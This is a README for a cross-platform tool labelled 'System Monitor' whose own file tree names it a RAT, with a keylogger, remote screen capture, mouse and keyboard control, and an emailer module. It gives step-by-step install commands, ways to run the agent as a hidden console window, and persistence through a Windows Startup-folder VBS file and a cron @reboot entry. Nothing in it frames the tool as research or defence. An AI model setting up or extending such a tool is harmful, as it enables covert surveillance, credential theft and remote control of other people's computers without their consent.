# Cross-Platform Support

The System Monitor now supports **Windows**, **Linux**, and **macOS**.

## Platform Detection

The agent automatically detects the operating system and uses the appropriate tools:

| Platform | Screen Capture | Mouse Control | Keyboard Input |
|----------|---------------|---------------|----------------|
| **Windows** | mss | pyautogui | pyautogui |
| **Linux** | mss | xdotool | xdotool |
| **macOS** | mss | osascript | osascript |

## Windows Installation

### One-Step Install
```cmd
cd path\to\rat
install_windows.bat
```

This will:
1. Check Python installation
2. Install required packages (flask, mss, pyautogui, etc.)
3. Initialize database
4. Create auto-start shortcut
5. Start all services

### Manual Install
```cmd
# Install Python packages
pip install flask flask-socketio requests mss pillow pyautogui

# Run agent
python rat_agent\agent.py

# Run dashboard
python dashboard\app.py
```

### Auto-Start on Windows
The installer creates a startup shortcut in:
```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\System Monitor.vbs
```

The agent will start automatically when you log in.

### Quick Start
```cmd
start_windows.bat
```

## Linux Installation

### One-Step Install
```bash
cd /path/to/rat
chmod +x install.sh
./install.sh
```

### Manual Install
```bash
# Install system tools
sudo apt-get install xdotool imagemagick

# Install Python packages
pip install flask flask-socketio requests mss pillow evdev

# Run
python3 rat_agent/agent.py
python3 dashboard/app.py
```

### Auto-Start on Linux
Configured via cron:
```bash
@reboot cd /path/to/rat && nohup python3 rat_agent/agent.py & ...
```

## macOS Installation

### Install Dependencies
```bash
# Install Python packages
pip3 install flask flask-socketio requests mss pillow

# Optional: Install xdotool via Homebrew
brew install xdotool
```

### Run
```bash
python3 rat_agent/agent.py
python3 dashboard/app.py
```

## Required Python Packages

| Package | Purpose | All Platforms |
|---------|---------|---------------|
| flask | Web dashboard | ✅ |
| flask-socketio | Real-time communication | ✅ |
| requests | HTTP requests | ✅ |
| mss | Screen capture | ✅ |
| pillow | Image processing | ✅ |
| pyautogui | Mouse/keyboard (Windows) | Windows |
| evdev | Input monitoring (Linux) | Linux |

## Platform-Specific Features

### Windows
- **Screen capture**: Full support via mss
- **Mouse control**: Full support via pyautogui
- **Keyboard input**: Full support via pyautogui
- **Auto-start**: Windows Startup folder
- **Background**: Runs as hidden console window

### Linux
- **Screen capture**: Full support via mss
- **Mouse control**: Full support via xdotool
- **Keyboard input**: Full support via xdotool
- **Auto-start**: cron @reboot or systemd
- **Background**: Daemon process

### macOS
- **Screen capture**: Full support via mss
- **Mouse control**: Basic support via osascript
- **Keyboard input**: Basic support via clipboard
- **Auto-start**: LaunchAgent (not configured yet)
- **Background**: Console process

## Running on Each Platform

### Windows
```cmd
# Install
install_windows.bat

# Start
start_windows.bat

# Stop
taskkill /F /IM python.exe
```

### Linux
```bash
# Install
./install.sh

# Start
./start.sh

# Stop
pkill -f 'rat_agent/agent.py'
pkill -f 'dashboard/app.py'
```

### macOS
```bash
# Install
pip3 install -r requirements.txt

# Start
python3 rat_agent/agent.py &
python3 dashboard/app.py

# Stop
pkill -f 'rat_agent/agent.py'
pkill -f 'dashboard/app.py'
```

## Troubleshooting

### Windows

**Python not found:**
- Install Python from https://python.org
- Check "Add Python to PATH" during installation

**pyautogui issues:**
- Reinstall: `pip install --force-reinstall pyautogui`
- May need: `pip install Pillow`

**Screen is black:**
- Ensure you're logged into a desktop session
- Remote Desktop may show black screen

### Linux

**xdotool not found:**
```bash
sudo apt-get install xdotool
```

**evdev issues:**
```bash
sudo apt-get install python3-evdev
# Or install kernel headers:
sudo apt-get install linux-headers-$(uname -r)
```

**Permission denied:**
```bash
chmod +x install.sh start.sh
```

### macOS

**Screen capture permission:**
- Go to System Preferences → Security & Privacy → Privacy
- Enable "Screen Recording" for Python

**Mouse control limited:**
- Install xdotool: `brew install xdotool`
- Or use System Events via osascript

## Cross-Platform Testing

Test on each platform:

```python
# Test screen capture
from rat_agent.screen import RemoteScreen
screen = RemoteScreen()
info = screen.get_screen_info()
print(f"Monitors: {len(info['monitors'])}")
print(f"System: {info['system']}")

# Test mouse movement
screen.move_mouse(100, 100)

# Test click
screen.click_mouse('left')

# Test typing
screen.type_text('Hello World')
```

## File Structure

```
rat/
├── rat_agent/
│   ├── agent.py          # Main agent (cross-platform)
│   ├── screen.py         # Screen control (cross-platform)
│   ├── keylogger.py      # Keylogger (Linux-focused)
│   ├── config.py         # Configuration
│   ├── database.py       # SQLite database
│   ├── emailer.py        # Email sending
│   └── logger.py         # Log capture
├── dashboard/
│   └── app.py            # Flask dashboard
├── install.sh            # Linux installer
├── install_windows.bat   # Windows installer
├── start.sh              # Linux starter
├── start_windows.bat     # Windows starter
└── requirements.txt      # Python dependencies
```

## Requirements.txt (All Platforms)

```
flask>=2.0.0
flask-socketio>=5.0.0
requests>=2.25.0
mss>=6.0.0
pillow>=8.0.0
python-socketio>=5.0.0
python-engineio>=4.0.0
pyautogui>=0.9.53    # Windows
evdev>=1.4.0         # Linux (optional)
```

## Summary

| Feature | Windows | Linux | macOS |
|---------|---------|-------|-------|
| Screen capture | ✅ | ✅ | ✅ |
| Mouse movement | ✅ | ✅ | ⚠️ Basic |
| Mouse click | ✅ | ✅ | ⚠️ Basic |
| Type text | ✅ | ✅ | ⚠️ Basic |
| Auto-start | ✅ | ✅ | ❌ |
| Background run | ✅ | ✅ | ✅ |
| Keylogger | ⚠️ | ✅ | ❌ |

**✅** Full support  
**⚠️** Partial support  
**❌** Not supported
